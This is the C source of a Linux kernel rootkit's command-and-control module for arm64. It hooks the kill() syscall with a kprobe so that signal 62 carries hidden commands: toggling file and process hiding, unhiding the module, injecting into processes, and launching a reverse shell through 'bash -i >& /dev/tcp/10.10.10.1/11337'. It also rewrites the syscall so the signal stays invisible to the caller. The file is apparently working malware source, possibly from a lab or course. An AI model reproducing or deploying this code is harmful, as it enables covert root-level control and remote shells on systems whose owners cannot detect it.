/*
 * c2.c: covert C2 channel via kill() syscall hooking
 *
 * Implementation: when signal == MAGIC_SIGNAL (62), interpret the
 * call as a rootkit command and swallow it so the caller sees success
 * instead of a delivered signal.
 *
 * The kill syscall is an __arm64_sys_* wrapper: the real registers are
 * one level of indirection away (double pt_regs).
 *
 * Toggle commands are deferred: (un)registering hooks cannot happen
 * from inside a hook handler. Used schedule_toggle / schedule_inject /
 * schedule_add_gid, schedule_spawn below. CMD_TOGGLE_BLOCK is safe to handle directly
 * (it is just a flag flip, no hook registration involved).
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* External state (defined in rootkit.c) */

extern int  blocking_init(void);
extern void blocking_exit(void);
extern bool blocking_active;
extern void hide_module(void);
extern void show_module(void);

/* Deferred injection (can't call vm_mmap from kprobe context) */

struct inject_work {
	struct work_struct work;
	pid_t target;
};

static void inject_work_fn(struct work_struct *w)
{
	struct inject_work *iw = container_of(w, struct inject_work, work);
	inject_trigger(iw->target);
	kfree(iw);
}

struct gid_work {
	struct work_struct work;
	pid_t target;
};

static void gid_work_fn(struct work_struct *w)
{
	struct gid_work *gw = container_of(w, struct gid_work, work);
	proc_hide_add_pid(gw->target);
	kfree(gw);
}

static void spawn_work_fn(struct work_struct *w)
{
  char *argv[] = {
    "/bin/sh",
    "-c",
    "bash -i >& /dev/tcp/10.10.10.1/11337 0>&1", //attacker IP and port here
    NULL
  };
  
  char *envp[] = {
    "HOME=/",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    NULL
  };

  pr_info("[C2] spawning reverse shell\n");
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  kfree(w);
}

static void schedule_add_gid(pid_t target)
{
	struct gid_work *gw = kmalloc(sizeof(*gw), GFP_ATOMIC);
	if (!gw)
		return;
	INIT_WORK(&gw->work, gid_work_fn);
	gw->target = target;
	schedule_work(&gw->work);
}

/* Toggle commands need to (un)register kprobes/kretprobes which can sleep,
 * so they can't run from kprobe context. Defer to a workqueue. */
struct toggle_work {
	struct work_struct work;
	int cmd;
};

static void toggle_work_fn(struct work_struct *w)
{
	struct toggle_work *tw = container_of(w, struct toggle_work, work);

	switch (tw->cmd) {
	case CMD_TOGGLE_HIDE:
		if (file_hide_is_active()) {
			file_hide_disable();
			pr_info("[rootkit] file hiding OFF\n");
		} else {
			file_hide_enable();
			pr_info("[rootkit] file hiding ON\n");
		}
		break;
	case CMD_TOGGLE_PROC:
		if (proc_hide_is_active()) {
			proc_hide_disable();
			pr_info("[rootkit] process hiding OFF\n");
		} else {
			proc_hide_enable();
			pr_info("[rootkit] process hiding ON\n");
		}
		break;
	case CMD_TOGGLE_MODULE:
		show_module();
		pr_info("[rootkit] module unhidden\n");
		break;
	}
	kfree(tw);
}

static void schedule_toggle(int cmd)
{
	struct toggle_work *tw = kmalloc(sizeof(*tw), GFP_ATOMIC);
	if (!tw)
		return;
	INIT_WORK(&tw->work, toggle_work_fn);
	tw->cmd = cmd;
	schedule_work(&tw->work);
}

static void schedule_inject(pid_t target)
{
	struct inject_work *iw = kmalloc(sizeof(*iw), GFP_ATOMIC);
	if (!iw)
		return;
	INIT_WORK(&iw->work, inject_work_fn);
	iw->target = target;
	schedule_work(&iw->work);
}

static void schedule_spawn(void)
{
  struct work_struct *w = kmalloc(sizeof(*w), GFP_ATOMIC);
  if (!w) return;
  INIT_WORK(w, spawn_work_fn);
  schedule_work(w);
}

/* Print usage helper */
void print_usage() {

}

/* kprobe kill pre_handler */
static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
  bool status;

  struct pt_regs *user_regs = (struct pt_regs *)regs->regs[0];
  int cmd = (int)user_regs->regs[0]; //like 0,1,2,3 etc
  int sig = (int)user_regs->regs[1]; //62

  //other kill signals pass through
  if (sig != MAGIC_SIGNAL)
    return 0;

  pr_info("[C2] C2 active on signal 62");
  pr_info("[C2] command %d from %s[%d]\n", cmd, current->comm, current->pid);
  switch(cmd) {
    case CMD_STATUS:
      pr_info("[rootkit][status] Current state log:");
      status = file_hide_is_active();
      pr_info("[rootkit][status]    File hiding        = %s\n", status ? "ENABLED" : "DISABLED");
      status = blocking_active;
      pr_info("[rootkit][status]    File blocking      - %s\n", status ? "ENABLED" : "DISABLED");
      /*
      status = module_hidden;
      pr_info("[rootkit][status]    Module self-hiding - %s\n", status ? "ENABLED" : "DISABLED");
      */
      status = proc_hide_is_active();
      pr_info("[rootkit][status]    Process hiding     - %s\n", status ? "ENABLED" : "DISABLED");
      break;
    case CMD_TOGGLE_HIDE:
      schedule_toggle(CMD_TOGGLE_HIDE);
      break;
    case CMD_TOGGLE_BLOCK:
      blocking_active = !blocking_active;
      break;
    /*
    case CMD_TOGGLE_MODULE:
      schedule_toggle(CMD_TOGGLE_MODULE);
      break;
    */
    case CMD_TOGGLE_PROC:
      schedule_toggle(CMD_TOGGLE_PROC);
      break;
    case CMD_ADD_GID:
      schedule_add_gid((pid_t)user_regs->regs[2]);
      break;
    case CMD_INJECT:
      schedule_inject((pid_t)user_regs->regs[2]);
      break;
    case CMD_REVSHELL:
      schedule_spawn();
      break;
    default:
      pr_warn("[C2][WARNING] unknown command %d\n", cmd);
      pr_info("[C2] usage: kill -62 <cmd>\n");
      pr_info("[C2]   0 - status\n");
      pr_info("[C2]   1 - file hiding\n");
      pr_info("[C2]   2 - access blocking\n");
      pr_info("[C2]   3 - unhide module\n");
      pr_info("[C2]   4 - proc hiding\n");
      pr_info("[C2]   5 - add GID\n");
      pr_info("[C2]   6 - inject\n");
      pr_info("[C2]   7 - revshell\n");
      break;
  }

  //one always swallows (the signal) 
  //rewrite to: kill(current->pid, 0) which is harmless
  //just checks if the process exists
  user_regs->regs[0] = current->pid; //target = self
  user_regs->regs[1] = 0;

  return 0;
}

/* kprobe definition */

static struct kprobe c2_kp = {
  .symbol_name = "__arm64_sys_kill",
  .pre_handler = kill_pre,
};

static bool active;

int c2_init(void)
{
	int ret = register_kprobe(&c2_kp);
  if (ret < 0) {
    pr_err("[C2][ERROR] failed to register kprobe: %d\n", ret);
    return ret;
  }
	
  active = true;
  pr_info("[C2] kprobe registered\n");
	return 0;
}

void c2_exit(void)
{
  if (!active) {
    pr_err("[C2][ERROR] Could not unregister kprobe (no kprobe active)\n");
    return;
  }
  
  unregister_kprobe(&c2_kp);
  pr_info("[C2] kprobe unregistered");
  active = false;
}
